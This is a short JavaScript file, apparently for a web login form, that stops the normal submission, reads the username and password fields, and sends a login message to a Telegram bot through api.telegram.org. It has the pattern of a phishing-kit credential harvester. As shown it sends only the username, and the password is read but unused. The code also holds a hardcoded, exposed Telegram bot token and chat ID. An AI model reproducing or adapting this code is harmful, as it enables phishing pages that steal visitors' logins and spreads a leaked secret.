document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Kirim data login ke bot Telegram
    sendDataToTelegram(`User ${username} has logged in.`);
});

function sendDataToTelegram(data) {
    const telegramBotToken = '6784104621:AAEVRyReTRmVtL_eGnFIZLbYm3FGkI0zF9M';
    const chatId = '7120969628';

    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const params = {
        chat_id: chatId,
        text: data
    };

    fetch(url, {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Login data sent to Telegram successfully!');
        } else {
            alert('Failed to send login data to Telegram.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
